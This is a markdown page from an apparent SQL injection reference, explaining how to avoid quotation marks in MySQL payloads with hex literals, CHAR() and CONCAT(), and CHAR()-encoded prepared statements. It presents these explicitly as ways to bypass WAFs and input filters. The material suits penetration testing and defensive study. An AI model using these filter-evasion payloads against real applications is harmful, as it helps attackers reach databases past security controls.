---
title: Avoiding Quotations
description: Techniques to avoid using quotes in MySQL injection
category: Injection Techniques
order: 10
tags: ["quotes", "evasion", "bypass"]
lastUpdated: 2023-03-15
---

## Avoiding Quotations

In some scenarios, web applications may implement filters that block or sanitize quotation marks (`'` or `"`). These techniques allow you to construct strings without using quotes.

### Using Hexadecimal Notation

MySQL allows representing string literals in hexadecimal by prefixing the hex value with `0x`:

```sql
-- 'admin' in hex
SELECT 0x61646D696E;
```

### Using CHAR() Function

The `CHAR()` function converts decimal ASCII values to characters:

```sql
-- 'root' using CHAR()
SELECT CHAR(114, 111, 111, 116);

-- Concatenating with CONCAT()
SELECT CONCAT(CHAR(114, 111, 111, 116), CHAR(64), CHAR(108, 111, 99, 97, 108, 104, 111, 115, 116));
-- Results in: root@localhost
```

### Using Prepared Statements

For more complex scenarios in MySQL 5+, you can use prepared statements:

```sql
SET @sql = CHAR(115, 101, 108, 101, 99, 116, 32, 64, 64, 118, 101, 114, 115, 105, 111, 110);
PREPARE stmt FROM @sql;
EXECUTE stmt;
-- Executes: SELECT @@version
```

### Examples in Injection Context

```sql
-- Original query using quotes
SELECT * FROM users WHERE username='admin' AND password='pass';

-- Using hex to avoid quotes
SELECT * FROM users WHERE username=0x61646D696E AND password=0x70617373;

-- Using CHAR() to avoid quotes
SELECT * FROM users WHERE username=CHAR(97, 100, 109, 105, 110) AND password=CHAR(112, 97, 115, 115);
```

These techniques are particularly useful for bypassing WAFs (Web Application Firewalls) and other security filters that specifically block quoted strings in SQL queries.